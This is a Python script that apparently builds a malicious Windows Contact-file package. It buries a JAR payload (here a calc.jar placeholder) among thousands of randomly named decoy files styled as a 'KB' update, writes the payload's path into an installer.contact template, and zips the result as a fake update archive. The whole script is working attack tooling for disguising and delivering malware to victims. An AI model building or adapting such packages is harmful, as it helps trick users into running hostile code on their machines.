import os, random, shutil

print("[+] Building junk files.")
if not os.path.isdir("template"):
	os.mkdir("template")
if not os.path.isdir("template/setup"):
	os.mkdir("template/setup")
template_path = ""
choice1 = random.randrange(10)
for i in range(10):
	if not os.path.isdir("template/setup/kb-part." + str(i)):
		os.mkdir("template/setup/kb-part." + str(i))
	choice2 = random.randrange(20)
	for j in range(20):
		if not os.path.isdir("template/setup/kb-part." + str(i) + "/kb-part" + str(j)):
			os.mkdir("template/setup/kb-part." + str(i) + "/kb-part" + str(j))
		choice3 = random.randrange(20)
		for z in range(20):
			if i == choice1 and j == choice2 and z == choice3:
				shutil.copyfile("payload/calc.jar", "template/setup/kb-part." + str(i) + "/kb-part" + str(j) + "/KB@3133722062023$part" + str(z) + ".jar")
				template_path = "setup\\kb-part." + str(i) + "\\kb-part" + str(j) + "\\KB@3133722062023$part" + str(z) + ".jar"
			else:
				f = open("template/setup/kb-part." + str(i) + "/kb-part" + str(j) + "/" + random.choice(["x41", "", "x5c"]) + "KB@3133722062023$part" + str(z) + random.choice([".jar", ".dat", ""]), "w")
				f.write("chunk")
				f.close()

print("[+] Update file installer.contact.")
f = open("template.contact", "r")
contact = f.read()
f.close()
f = open("template/installer.contact", "w")
print("[+] Payload path is: %s" % template_path)
installer = contact.replace("payload-path", template_path)
f.write(installer)
f.close()
print("[+] Zipping.")
shutil.make_archive('KB-3133722062023','zip','template')
print("[+] Done.")
